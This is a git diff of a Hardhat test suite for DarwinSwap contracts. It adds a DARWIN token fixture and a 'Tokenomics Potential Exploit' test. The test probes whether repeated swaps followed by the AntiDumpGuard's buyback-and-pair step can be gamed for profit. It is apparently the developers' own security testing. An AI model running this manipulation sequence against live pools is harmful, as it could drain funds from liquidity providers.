@@ -80,9 +80,10 @@ describe("Test Suite", function () {
 
 
   async function deployFixture() {
-    const [owner, addr1, addr2] = await hardhat.ethers.getSigners();
+    const [owner, addr1, addr2, tokenomicsFeeReceiver] = await hardhat.ethers.getSigners();
     const erc20Factory = await ethers.getContractFactory("TestERC20");
     const weth = await erc20Factory.deploy("Wrapped BNB", "WBNB", owner.address) as TestERC20;
+    await weth.deposit({value: eth("1000000")});
     const darwin = await erc20Factory.deploy("Darwin", "DARWIN", owner.address) as TestERC20;
     const token = await erc20Factory.deploy("Token", "TKN", owner.address) as TestERC20;
     const token1 = await erc20Factory.deploy("Token1", "TKN1", owner.address) as TestERC20;
@@ -103,27 +104,40 @@ describe("Test Suite", function () {
     const router = await darwinRouterFactory.deploy(factory.address, weth.address) as DarwinSwapRouter;
     await factory.setRouter(router.address);
     await factory.setFeeTo(owner.address);
+      fixtureProp = proposal();
+      fixtureProp.addedToks.tokenA2TaxOnBuy = 250;
+      fixtureProp.status = TokenStatus.LISTED;
+      fixtureProp.validator = owner.address;
+      fixtureProp.valid = true;
+      fixtureProp.official = true;
+      fixtureProp.owner = owner.address;
+      fixtureProp.feeReceiver = tokenomicsFeeReceiver.address;
+      fixtureProp.addedToks.tokenB1SellToADG = 250;
+    await lister.listToken(darwin.address, fixtureProp);
     const bundles = bundlesFactory.attach(await factory.liquidityBundles()) as DarwinLiquidityBundles;
-    return {owner, addr1, addr2, weth, token, token1, library, lister, factory, router, masterChef, busd, erc20Factory, pairFactory, bundles};
+    return {owner, addr1, addr2, weth, token, token1, library, lister, factory, router, masterChef, busd, erc20Factory, pairFactory, bundles, darwin};
   }
 
 
 
 
   async function pairFixture() {
-    const { busd, lister, weth, token, router, owner, addr1, addr2, factory, pairFactory } = await loadFixture(deployFixture);
+    const { busd, lister, weth, token, router, owner, addr1, addr2, factory, pairFactory, darwin } = await loadFixture(deployFixture);
     await lister.listToken(token.address, fixtureProp);
     await lister.listOfficialToken(weth.address);
     await lister.listOfficialToken(busd.address);
     await token.approve(router.address, eth("10000000000"));
     await weth.approve(router.address, eth("10000000000"));
     await busd.approve(router.address, eth("10000000000"));
+    await darwin.approve(router.address, eth("10000000000"));
+    await router.addLiquidity(darwin.address, weth.address, eth("1000"), eth("1000"), 0, 0, owner.address, Math.floor(Date.now() / 1000) + 600);
     await router.addLiquidity(token.address, weth.address, eth("1000"), eth("1000"), 0, 0, owner.address, Math.floor(Date.now() / 1000) + 600);
     await router.addLiquidity(busd.address, weth.address, eth("10000"), eth("1000"), 0, 0, owner.address, Math.floor(Date.now() / 1000) + 600);
+    const darwinPair = await factory.getPair(darwin.address, weth.address);
     const pairAddress = await factory.getPair(token.address, weth.address);
     const pair = pairFactory.attach(pairAddress) as DarwinSwapPair;
     const addedToks = (await lister.tokenInfo(token.address)).addedToks;
-    return { lister, weth, token, router, owner, addr1, addr2, pair, addedToks };
+    return { lister, weth, token, router, owner, addr1, addr2, pair, addedToks, darwin, darwinPair, pairFactory };
   }
 
 
@@ -197,6 +211,49 @@ describe("Test Suite", function () {
       await token.approve(router.address, ethers.utils.parseEther("1"));
       await router.addLiquidityETH(token.address, ethers.utils.parseEther("1"), 0, 0, owner.address, Math.floor(Date.now() / 1000) + 600, {value: ethers.utils.parseEther("1")});
       await expect(await router.swapExactETHForTokensSupportingFeeOnTransferTokens(ethers.utils.parseEther("0.01"), [router.WETH(), token.address], owner.address, Math.floor(Date.now() / 1000) + 600, {value: ethers.utils.parseEther("1")})).to.not.be.reverted;
+    });
+
+    it("Tokenomics Potential Exploit", async function () {
+      const { router, owner, weth, darwin, darwinPair, pairFactory } = await loadFixture(pairFixture);
+      const swaps = 30;
+      const balanceBefore = await darwin.balanceOf(owner.address);
+      const ethBalanceBefore = await owner.getBalance();
+      console.log("          1️⃣  ETH Balance (before): " + ethers.utils.formatEther(ethBalanceBefore));
+      console.log("          2️⃣  Darwin Balance (before): " + ethers.utils.formatEther(balanceBefore));
+      console.log(`          3️⃣  Pair Balance (before): ${ethers.utils.formatEther(await darwin.balanceOf(darwinPair))} DARWIN - ${ethers.utils.formatEther(await weth.balanceOf(darwinPair))} ETH`);
+      console.log("");
+      await router.swapExactETHForTokensSupportingFeeOnTransferTokens(eth("0"), [weth.address, darwin.address], owner.address, await time.latest() + 1000, {value: eth("500")});
+      for (let i = 0; i < swaps; i ++) {
+        await router.swapExactTokensForETHSupportingFeeOnTransferTokens(eth("250"), eth("0"), [darwin.address, weth.address], owner.address, await time.latest() + 1000);
+        await router.swapExactETHForTokensSupportingFeeOnTransferTokens(eth("0"), [weth.address, darwin.address], owner.address, await time.latest() + 1000, {value: eth("250")});
+      };
+      console.log("             DONE " + swaps + " SWAPS");
+      const pairContract = pairFactory.attach(darwinPair);
+      const adg = await pairContract.antiDumpGuard();
+      const adgFactory = await ethers.getContractFactory("AntiDumpGuard");
+      const adgContract = adgFactory.attach(adg);
+      console.log("          1️⃣  ETH Balance (before inject): " + ethers.utils.formatEther(await owner.getBalance()));
+      console.log("          2️⃣  Darwin Balance (before inject): " + ethers.utils.formatEther(await darwin.balanceOf(owner.address)));
+      console.log(`          3️⃣  Pair Balance (before inject): ${ethers.utils.formatEther(await darwin.balanceOf(darwinPair))} DARWIN - ${ethers.utils.formatEther(await weth.balanceOf(darwinPair))} ETH`);
+      console.log("          1️⃣  ETH Balance of ADG (before inject): " + ethers.utils.formatEther(await weth.balanceOf(adg)));
+      console.log("          2️⃣  Darwin Balance of ADG (before inject): " + ethers.utils.formatEther(await darwin.balanceOf(adg)));
+      console.log("");
+      console.log("             BUYBACK AND PAIR (INJECT)");
+      console.log("");
+      await adgContract.buyBackAndPair(darwin.address);
+      console.log("          1️⃣  ETH Balance (after inject): " + ethers.utils.formatEther(await owner.getBalance()));
+      console.log("          2️⃣  Darwin Balance (after inject): " + ethers.utils.formatEther(await darwin.balanceOf(owner.address)));
+      console.log(`          3️⃣  Pair Balance (after inject): ${ethers.utils.formatEther(await darwin.balanceOf(darwinPair))} DARWIN - ${ethers.utils.formatEther(await weth.balanceOf(darwinPair))} ETH`);
+      console.log("          1️⃣  ETH Balance of ADG (after inject): " + ethers.utils.formatEther(await weth.balanceOf(adg)));
+      console.log("          2️⃣  Darwin Balance of ADG (after inject): " + ethers.utils.formatEther(await darwin.balanceOf(adg)));
+      console.log("");
+      let balanceAfter = await darwin.balanceOf(owner.address);
+      await router.swapExactTokensForETHSupportingFeeOnTransferTokens(balanceAfter.sub(balanceBefore), eth("0"), [darwin.address, weth.address], owner.address, await time.latest() + 1000);
+      balanceAfter = await darwin.balanceOf(owner.address);
+      const ethBalanceAfter = await owner.getBalance();
+      console.log("          1️⃣  ETH Balance (after): " + ethers.utils.formatEther(ethBalanceAfter));
+      console.log("          2️⃣  Darwin Balance (after): " + ethers.utils.formatEther(balanceAfter));
+      console.log(`          3️⃣  Pair Balance (after): ${ethers.utils.formatEther(await darwin.balanceOf(darwinPair))} DARWIN - ${ethers.utils.formatEther(await weth.balanceOf(darwinPair))} ETH`);
     });
   });
 
